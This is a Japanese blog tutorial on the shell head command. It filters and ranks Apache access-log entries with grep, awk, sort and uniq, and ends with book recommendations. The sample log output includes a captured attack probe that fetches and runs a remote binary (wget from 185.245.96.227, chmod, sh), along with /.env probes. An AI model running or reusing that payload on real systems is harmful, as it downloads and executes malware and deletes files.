---
title: "（３）【head】シェルスクリプトコマンド活用紹介"
description: "headはテキストファイルの最初の10行を、tailは最後の10行を表示するコマンドです。表示する行数は、オプションで変更することができます。"
date: 2022-02-10T10:23:14+09:00
draft: false
authors: suzuki
image: bash.jpg
categories:
  - programming
tags:
  - ざっくりわかるシリーズ
  - シェルスクリプト
  - Bash
  - 鈴木維一郎
---

## headコマンド
- headコマンドでファイルの先頭部分だけを表示する
- パイプを使って実行結果の最初の部分だけを確認する
- tailコマンドでファイルの末尾部分だけを表示する
- ログファイルを監視する


## 概要
headはテキストファイルの最初の10行を、tailは最後の10行を表示するコマンドです。
表示する行数は、オプションで変更することができます。

```
$ cat ＜ファイル名＞ | head -n10
```

headコマンドは「コマンド | head」のように、別のコマンドの実行結果の先頭部分を表示する際によく使われます。

## headコマンドの書式
head [オプション] ファイル名


## headコマンドの主なオプション


|オプション  |長いオプション  |意味|
|:----------:|----------------|----|
|-c  数字    |--bytes 数字      |先頭から指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=1000*1000, M=1024*1024…）|
|-n  数字    |--lines 数字      |先頭から指定した行数のみ表示する|
|-q          |--quiet, --silent |ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う）|
|-v          |--verbose         |常にファイルごとのヘッダ出力を行う|


## headコマンド詳細説明
headコマンドはファイルの先頭から１０行を表示するコマンドです。

```
$ cat filename | head 
```

よく使われるオプションは、出力する行数を指定するオプション「n」です。

```
$ cat filename | head -n20
```

データをソートしてベスト１０を出力するという場合によく使います。

```
$ sudo cat /var/log/httpd/access_log | grep -iv "ELB-Health-Checker" | awk -F '"' '{ print $1; }' | awk '{ print $2; }' | sort | uniq -c | sort -nr | head
```

sudo で一時的にrootになります。/var/log/ ディレクトリはローカルアカウントではアクセスできないことが多いです。
では、順番に説明していきます。

まずは純粋にアクセスログを出力します。
長いのでheadコマンドを使いましょう。

```
suzuki$ sudo cat /var/log/httpd/access_log | head
172.31.44.102 - - [28/Nov/2021:03:09:13 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.17.106 - - [28/Nov/2021:03:09:25 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.44.102 - - [28/Nov/2021:03:09:43 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.17.106 - - [28/Nov/2021:03:09:55 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.44.102 - - [28/Nov/2021:03:10:13 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.17.106 - - [28/Nov/2021:03:10:25 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.44.102 - - [28/Nov/2021:03:10:43 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
172.31.17.106 - - [28/Nov/2021:03:10:55 +0900] "GET / HTTP/1.1" 302 206 "-" "ELB-HealthChecker/2.0"
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] "GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1" 302 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154"
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] "CONNECT guba.eastmoney.com:443 HTTP/1.1" 302 215 "-" "Apache-HttpClient/4.1 (java 1.5)"
:
:
:

```

AWSのロードバランサーからの定期的なポーリングが多いのでgrep -v で除去します。
grepコマンドの -v オプションは「除外する」という意味です。-i オプションは大文字小文字を区別しないという意味です。

```
suzuki$ sudo cat /var/log/httpd/access_log | grep -v "ELB-HealthChecker" | head
 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] "GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1" 302 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154"
 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] "CONNECT guba.eastmoney.com:443 HTTP/1.1" 302 215 "-" "Apache-HttpClient/4.1 (java 1.5)"
 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] "GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1" 302 230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154"
 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] "CONNECT guba.eastmoney.com:443 HTTP/1.1" 302 215 "-" "Apache-HttpClient/4.1 (java 1.5)"
 98.244.147.169 - - [28/Nov/2021:03:13:12 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws" 400 226 "-" "-"
 61.136.101.77 - - [28/Nov/2021:03:15:39 +0900] "GET http://dushu.baidu.com HTTP/1.1" 302 208 "-" "-"
 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] "POST / HTTP/1.1" 302 205 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
 135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] "GET /.env HTTP/1.1" 302 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
 61.136.101.133 - - [28/Nov/2021:03:17:46 +0900] "GET http://dushu.baidu.com HTTP/1.1" 302 208 "-" "-"
 164.90.204.15 - - [28/Nov/2021:03:20:54 +0900] "CONNECT www.yahoo.com:443 HTTP/1.1" 302 210 "-" "Go-http-client/1.1"
 suzuki$
 ```

 それっぽいログが出るようになりました。
 次にどこからのアクセスが多いのかを絞り込みます。

 ```
 suzuki$ sudo cat /var/log/httpd/access_log | grep -v "ELB-HealthChecker" | awk -F '"' '{ print $2; }' | head
  GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
  CONNECT guba.eastmoney.com:443 HTTP/1.1
  GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
  CONNECT guba.eastmoney.com:443 HTTP/1.1
  GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws
  GET http://dushu.baidu.com HTTP/1.1
  POST / HTTP/1.1
  GET /.env HTTP/1.1
  GET http://dushu.baidu.com HTTP/1.1
  CONNECT www.yahoo.com:443 HTTP/1.1
  suzuki$
  ```

  GETとPOSTの項目に絞り込まれました。
  awk コマンドの -F はセパレータで、この場合は '"' を区切り文字として２番目の値を出力するという意味になります。最後のheadは確認は出力の冒頭だけで十分なのでつけています。

次は、GET, CONNECT, POSTなどのコマンドを除去します。
awkコマンドのデフォルトのセパレーターは空白なので、空白区切りで数えると二つ目を表す $2 を使って絞り込みます。

```
suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v "ELB-HealthChecker" | awk -F '"' '{ print $2; }' | awk '{ print $2; }' | head
 http://guba.eastmoney.com/list,hk01500_1.html
 guba.eastmoney.com:443
 http://guba.eastmoney.com/list,hk01500_1.html
 guba.eastmoney.com:443
 /shell?cd+/tmp;rm+-rf+*;wget+
 http://dushu.baidu.com
 /
 /.env
 http://dushu.baidu.com
 www.yahoo.com:443
 suzuki$
```

次に、余計な出力を抑制します。
ここでは空白行を出力したくないので grep -v ^$ を使っています。
非常によく使うオプションなので覚えておくとよいです。

{{% tips-list tips %}}
ヒント
: grep -v ^$
: 空行を出力しない
: 行頭を表す「^」と行末を表す「$」の間に何もないですね。
{{% /tips-list %}}


では、同様にgrep -vで アスタリスクとスラッシュだけの行を絞り込みます。

```
suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v "ELB-HealthChecker" | awk -F '"' '{ print $2; }' | awk '{ print $2; }'| grep -v ^$ | grep -v [*/] |s
 ort| head
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 110.242.68.4:443
 suzuki$
 ```

 最後に、出力をアルファベット順に並べ替えます。sortでよいです。
 さらに uniq コマンドで同じ複数のレコードを一つにするわけですが、 -c オプションを使うと、何件の複数のレコードを一つにまとめたのかを、行頭に示してくれます。
 そして sort -nr の -n は、行頭の数値、いわゆるuniq -c でまとめた件数を数値として並べ替えるという意味です。-r は、リバース、いわゆる逆順ソートですね。ここでは、件数の多いものから順番に出力します。headコマンドはデフォルトが１０検出力なので、head -n10 と書いてもよいですし、省略して head だけでもよいです。


 ```
 suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v "ELB-HealthChecker" | awk -F '"' '{ print $2; }' | awk '{ print $2; }'|sort|uniq -c|sort -nr | head
850 http://dushu.baidu.com
839 /form.cgi
485 http://www.baidu.com/pub/css/new_font.css
477 /
265 *
258 guba.eastmoney.com:443
253
209 /.env
200 www.yahoo.com:443
184 istock.jrj.com.cn:443
suzuki$
```

{{% tips-list tips %}}
ヒント
:sudo cat filename | grep -v "除去したい文字列" | awk '{ print $2; }'| sort | uniq -c |sort -nr | head
: これはもはや定番中の定番です。覚えましょう。体に叩き込みましょう。 
{{% /tips-list %}}


head コマンドの紹介の割には長くなりました。


## 書籍の紹介

{{% amazon

title="詳解 シェルスクリプト 大型本 – 2006/1/16"

url="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4873112672&linkCode=as2&tag=nlpqueens09-22&linkId=ef087fd92d3628bb94e1eb10cb202d43"

summary=`Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
`
imageUrl="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg"
%}}

{{% amazon

title="UNIXシェルスクリプト マスターピース132"

url="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4797377623&linkCode=as2&tag=nlpqueens09-22&linkId=3c8d4566263ae99374221c4f8f469154"

summary=`すべてのUNIXエンジニア必携!!

サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。
`
imageUrl="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg"
%}}


{{% amazon

title="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB+DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20"

url="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4774186945&linkCode=as2&tag=nlpqueens09-22&linkId=8ef3ff961c569212e910cf3d6e37dcb6"

summary=`定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。`
imageUrl="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg"
%}}

{{% amazon

title="新しいシェルプログラミングの教科書 単行本"

url="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&camp=247&creative=1211&creativeASIN=4797393106&linkCode=as2&tag=nlpqueens09-22&linkId=f514a6378c1c10e59ab16275745c2439"

summary=`エキスパートを目指せ!!

システム管理やソフトウェア開発など、
実際の業務では欠かせないシェルスクリプトの知識を徹底解説

ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。
イマドキのエンジニア必携の一冊。

▼目次
CHAPTER01 シェルってなんだろう
CHAPTER02 シェルスクリプトとは何か
CHAPTER03 シェルスクリプトの基本
CHAPTER04 変数
CHAPTER05 クォーティング
CHAPTER06 制御構造
CHAPTER07 リダイレクトとパイプ
CHAPTER08 関数
CHAPTER09 組み込みコマンド
CHAPTER10 正規表現と文字列
CHAPTER11 シェルスクリプトの実行方法
CHAPTER12 シェルスクリプトのサンプルで学ぼう
CHAPTER13 シェルスクリプトの実用例
CHAPTER14 テストとデバッグ
CHAPTER15 読みやすいシェルスクリプト
`
imageUrl="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg"
%}}


